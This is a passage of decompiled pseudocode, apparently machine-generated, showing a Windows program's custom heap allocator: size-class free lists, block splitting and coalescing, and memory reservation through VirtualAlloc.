			eax_31 = 0x02;
		else
			eax_31 = 0x03;
	}
	else if (ebx_20 <= globals->dw405280)
		eax_31 = ((word32) (ebx_20 <= globals->dw40527C) - 0x01 & 0x01) + 0x04;
	else if (ebx_20 <= globals->dw405284)
		eax_31 = 0x06;
	else
		eax_31 = 0x07;
	int32 esi_270 = eax_31;
	uint32 * edi_271 = null;
	uint32 dwLoc08_273 = 0x00;
	if (eax_31 < globals->dw40528C)
	{
		esi_270 = globals->dw40528C;
		dwLoc08_273 = 0x00;
		edi_271 = null;
	}
	while (dwLoc08_273 < ebx_20 && esi_270 < 0x08)
	{
		uint32 * eax_284 = globals->a40523C[esi_270 * 0x04];
		esi_270 = esi_270 + 0x01;
		edi_271 = eax_284;
		if (eax_284 != null)
		{
			if (globals->ptr405260 + -0x01 == eax_284)
				edi_271 = *(eax_284 - 0x04);
			do
			{
				uint32 edx_297 = *edi_271;
				dwLoc08_273 = edx_297;
				if (edx_297 >= ebx_20)
					break;
				edi_271 = *(edi_271 - 0x04);
			} while (edi_271 != edi_271);
		}
	}
	ptr32 eax_111;
	if (dwLoc08_273 < ebx_20)
	{
		eax_111 = fn00402CA0(ebx_20);
		if (eax_111 == 0x00)
			return eax_111;
		esi_270 = globals->dw405290;
		edi_271 = globals->a40523C[esi_270 * 0x04];
		dwLoc08_273 = *edi_271;
	}
	else if (esi_270 > 0x00)
		esi_270 = esi_270 - 0x01;
	uint32 eax_85 = dwLoc08_273 - ebx_20;
	if (eax_85 >= 0x04)
	{
		int32 dwLoc0C_116;
		if (eax_85 <= globals->dw405278)
		{
			int32 edx_201;
			if (eax_85 <= globals->dw405270)
				edx_201 = (word32) (eax_85 > globals->dw40526C);
			else if (eax_85 <= globals->dw405274)
				edx_201 = 0x02;
			else
				edx_201 = 0x03;
			dwLoc0C_116 = edx_201;
		}
		else if (eax_85 <= globals->dw405280)
			dwLoc0C_116 = ((word32) (eax_85 <= globals->dw40527C) - 0x01 & 0x01) + 0x04;
		else if (eax_85 <= globals->dw405284)
			dwLoc0C_116 = 0x06;
		else
			dwLoc0C_116 = 0x07;
		if (dwLoc0C_116 != esi_270)
		{
			uint32 * edx_123 = *(edi_271 - 0x04);
			if (edi_271 == edx_123)
			{
				globals->a40523C[esi_270 * 0x04] = 0x00;
				if (globals->dw40528C == esi_270)
				{
					while (true)
					{
						int32 ecx_170 = globals->dw40528C;
						if (globals->a40523C[ecx_170 * 0x04] != 0x00 || ecx_170 >= 0x07)
							break;
						globals->dw40528C = globals->dw40528C + 0x01;
					}
				}
			}
			else
			{
				ptr32 ecx_179 = *(edi_271 - 0x08);
				*(ecx_179 - 0x04) = edx_123;
				*(edx_123 - 0x08) = ecx_179;
				if (globals->a40523C[esi_270 * 0x04] == edi_271)
					globals->a40523C[esi_270 * 0x04] = ecx_179;
			}
			uint32 * dwLoc18_136;
			uint32 * edx_132 = globals->a40523C[dwLoc0C_116 * 0x04];
			if (edx_132 == null)
			{
				globals->a40523C[dwLoc0C_116 * 0x04] = edi_271;
				dwLoc18_136 = edi_271;
				edx_132 = edi_271;
				if (globals->dw40528C > dwLoc0C_116)
					globals->dw40528C = dwLoc0C_116;
			}
			else
				dwLoc18_136 = *(edx_132 - 0x08);
			*(edi_271 - 0x04) = edx_132;
			*(edx_132 - 0x08) = edi_271;
			*(dwLoc18_136 - 0x04) = edi_271;
			*(edi_271 - 0x08) = dwLoc18_136;
			(edi_271 + -(eax_85 << 0x02))[0x01] = eax_85;
			*edi_271 = eax_85;
		}
		else
		{
			(edi_271 + -(eax_85 << 0x02))[0x01] = eax_85;
			*edi_271 = eax_85;
		}
	}
	else
	{
		uint32 * eax_231 = *(edi_271 - 0x04);
		if (edi_271 == eax_231)
		{
			globals->a40523C[esi_270 * 0x04] = 0x00;
			if (globals->dw40528C == esi_270)
			{
				while (true)
				{
					int32 edx_248 = globals->dw40528C;
					if (globals->a40523C[edx_248 * 0x04] != 0x00 || edx_248 >= 0x07)
						break;
					globals->dw40528C = globals->dw40528C + 0x01;
				}
			}
		}
		else
		{
			ptr32 edx_256 = *(edi_271 - 0x08);
			*(edx_256 - 0x04) = eax_231;
			*(eax_231 - 0x08) = edx_256;
			if (globals->a40523C[esi_270 * 0x04] == edi_271)
				globals->a40523C[esi_270 * 0x04] = edx_256;
		}
		ebx_20 = dwLoc08_273;
	}
	struct Eq_2438 * eax_103 = edi_271 + -(dwLoc08_273 * 0x04);
	ui32 eax_106 = ebx_20 | 0x80000000;
	eax_103[ebx_20 * 0x04 / 0x08] = (struct Eq_2438) eax_106;
	eax_103->dw0004 = eax_106;
	eax_111 = &eax_103->dw0004 + 0x01;
	return eax_111;
}

// 004031F0: Register word32 fn004031F0(Stack Eq_629 dwArg04)
word32 fn004031F0(Eq_629 dwArg04)
{
	word32 esi_10 = 0x00;
	if (dwArg04 < globals->t405038)
		esi_10 = fn00402EF0(dwArg04);
	if (esi_10 == 0x00)
		esi_10 = fn00402460(dwArg04);
	if (esi_10 == 0x00)
		globals->dw405298 = 0x0C;
	return esi_10;
}

// 00403230: void fn00403230(Stack Eq_629 dwArg04)
void fn00403230(Eq_629 dwArg04)
{
	if ((*((word32) dwArg04 - 0x04) & 0x80000000) == 0x00)
		globals->dw405298 = 22;
	else
	{
		ui32 eax_52 = *((word32) dwArg04 - 0x04);
		uint32 eax_197 = eax_52 & 0x7FFFFFFF;
		struct Eq_2584 * edx_298 = dwArg04 - 0x08 + (eax_52 & 0x7FFFFFFF) * 0x04;
		int32 dwLoc08_289 = dwLoc08 | ~0x00;
		if ((edx_298->dw0004 & 0x80000000) == 0x00)
		{
			int32 dwLoc0C_284;
			struct Eq_2584 * esi_280 = edx_298 + (edx_298->dw0004 * 0x04) / 0x08;
			if (esi_280->dw0000 <= globals->dw405278)
			{
				int32 ecx_304;
				if (esi_280->dw0000 <= globals->dw405270)
					ecx_304 = (word32) (esi_280->dw0000 > globals->dw40526C);
				else if (esi_280->dw0000 <= globals->dw405274)
					ecx_304 = 0x02;
				else
					ecx_304 = 0x03;
				dwLoc0C_284 = ecx_304;
			}
			else if (esi_280->dw0000 <= globals->dw405280)
				dwLoc0C_284 = ((word32) (esi_280->dw0000 <= globals->dw40527C) - 0x01 & 0x01) + 0x04;
			else if (esi_280->dw0000 <= globals->dw405284)
				dwLoc0C_284 = 0x06;
			else
				dwLoc0C_284 = 0x07;
			eax_197 = (eax_52 & 0x7FFFFFFF) + esi_280->dw0000;
			esi_280->dw0000 = eax_197;
			(esi_280 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
			dwLoc08_289 = dwLoc0C_284;
			edx_298 = esi_280;
		}
		if ((*(dwArg04 - 0x08) & 0x80000000) == 0x00)
		{
			int32 esi_202;
			eax_197 = eax_197 + *(dwArg04 - 0x08);
			if (*(dwArg04 - 0x08) <= globals->dw405278)
			{
				int32 ecx_243;
				if (*(dwArg04 - 0x08) <= globals->dw405270)
					ecx_243 = (word32) (*(dwArg04 - 0x08) > globals->dw40526C);
				else if (*(dwArg04 - 0x08) <= globals->dw405274)
					ecx_243 = 0x02;
				else
					ecx_243 = 0x03;
				esi_202 = ecx_243;
			}
			else if (*(dwArg04 - 0x08) <= globals->dw405280)
				esi_202 = ((word32) (*(dwArg04 - 0x08) <= globals->dw40527C) - 0x01 & 0x01) + 0x04;
			else if (*(dwArg04 - 0x08) <= globals->dw405284)
				esi_202 = 0x06;
			else
				esi_202 = 0x07;
			ptr32 ecx_204 = *(dwArg04 - 0x0C);
			if (dwArg04 - 0x08 == ecx_204)
			{
				globals->a40523C[esi_202 * 0x04] = 0x00;
				if (globals->dw40528C == esi_202)
				{
					while (true)
					{
						int32 esi_224 = globals->dw40528C;
						if (globals->a40523C[esi_224 * 0x04] != 0x00 || esi_224 >= 0x07)
							break;
						globals->dw40528C = globals->dw40528C + 0x01;
					}
				}
			}
			else
			{
				ptr32 esi_232 = *(dwArg04 - 0x10);
				*(esi_232 - 0x04) = ecx_204;
				*(ecx_204 - 0x08) = esi_232;
				if (globals->a40523C[esi_202 * 0x04] == dwArg04 - 0x08)
					globals->a40523C[esi_202 * 0x04] = esi_232;
			}
			edx_298->dw0000 = eax_197;
			(edx_298 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
		}
		int32 ebx_163;
		if (eax_197 <= globals->dw405278)
		{
			int32 ecx_161;
			if (eax_197 <= globals->dw405270)
				ecx_161 = (word32) (eax_197 > globals->dw40526C);
			else if (eax_197 <= globals->dw405274)
				ecx_161 = 0x02;
			else
				ecx_161 = 0x03;
			ebx_163 = ecx_161;
		}
		else if (eax_197 <= globals->dw405280)
			ebx_163 = ((word32) (eax_197 <= globals->dw40527C) - 0x01 & 0x01) + 0x04;
		else if (eax_197 <= globals->dw405284)
			ebx_163 = 0x06;
		else
			ebx_163 = 0x07;
		if (dwLoc08_289 != ebx_163)
		{
			if (dwLoc08_289 >= 0x00)
			{
				struct Eq_2584 * ecx_129 = *(edx_298 - 0x04);
				if (edx_298 == ecx_129)
				{
					globals->a40523C[dwLoc08_289 * 0x04] = 0x00;
					if (globals->dw40528C == dwLoc08_289)
					{
						while (true)
						{
							int32 ebx_140 = globals->dw40528C;
							if (globals->a40523C[ebx_140 * 0x04] != 0x00 || ebx_140 >= 0x07)
								break;
							globals->dw40528C = globals->dw40528C + 0x01;
						}
					}
				}
				else
				{
					ptr32 ebx_148 = *(edx_298 - 0x08);
					*(ebx_148 - 0x04) = (struct Eq_2584 **) ecx_129;
					*(ecx_129 - 0x08) = ebx_148;
					if (globals->a40523C[dwLoc08_289 * 0x04] == edx_298)
						globals->a40523C[dwLoc08_289 * 0x04] = ebx_148;
				}
			}
			struct Eq_2584 * ebx_107;
			struct Eq_2584 * ecx_106 = globals->a40523C[ebx_163 * 0x04];
			if (ecx_106 == null)
			{
				globals->a40523C[ebx_163 * 0x04] = edx_298;
				ebx_107 = edx_298;
				ecx_106 = edx_298;
				if (globals->dw40528C > ebx_163)
					globals->dw40528C = ebx_163;
			}
			else
				ebx_107 = (struct Eq_2584 *) *(ecx_106 - 0x08);
			*(edx_298 - 0x04) = (struct Eq_2584 **) ecx_106;
			*(ecx_106 - 0x08) = (struct Eq_2584 **) edx_298;
			*(ebx_107 - 0x04) = (struct Eq_2584 **) edx_298;
			*(edx_298 - 0x08) = (struct Eq_2584 **) ebx_107;
			(edx_298 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
			edx_298->dw0000 = eax_197;
			globals->dw405290 = ebx_163;
			globals->a40523C[ebx_163 * 0x04] = edx_298;
		}
	}
}

// 00403550: void fn00403550(Stack Eq_629 dwArg04)
void fn00403550(Eq_629 dwArg04)
{
	if (dwArg04 != 0x00)
	{
		if (dwArg04 - 0x04 > globals->ptr405264 && dwArg04 - 0x04 < globals->ptr405260)
			fn00403230(dwArg04);
		else
			fn004024A0(dwArg04);
	}
}

// 00403630: Register Eq_629 fn00403630(Stack Eq_629 dwArg04)
Eq_629 fn00403630(Eq_629 dwArg04)
{
	Eq_629 eax_26;
	if (globals->t405030 == 0x00)
	{
		eax_26 = VirtualAlloc(0x00, globals->t405034, 0x2000, 0x01);
		globals->t405030 = eax_26;
		if (eax_26 == 0x00)
			return eax_26;
	}
	eax_26 = VirtualQuery(globals->t405030, fp - 0x20, 0x1C);
	if (eax_26 != 0x00)
	{
		Eq_629 eax_53;
		if (dwLoc10 == 0x1000)
			eax_53 = (word32) globals->t405030 + dwLoc14;
		else
			eax_53 = globals->t405030;
		if (dwArg04 + eax_53 >=u Mem0[0x00405034:word32] + Mem0[0x00405030:word32])
			eax_26.u0 = 0x00;
		else
		{
			eax_26 = VirtualAlloc(eax_53, dwArg04, 0x1000, 0x04);
			if (eax_26 != 0x00)
				eax_26 = eax_53;
		}
	}
	return eax_26;
}

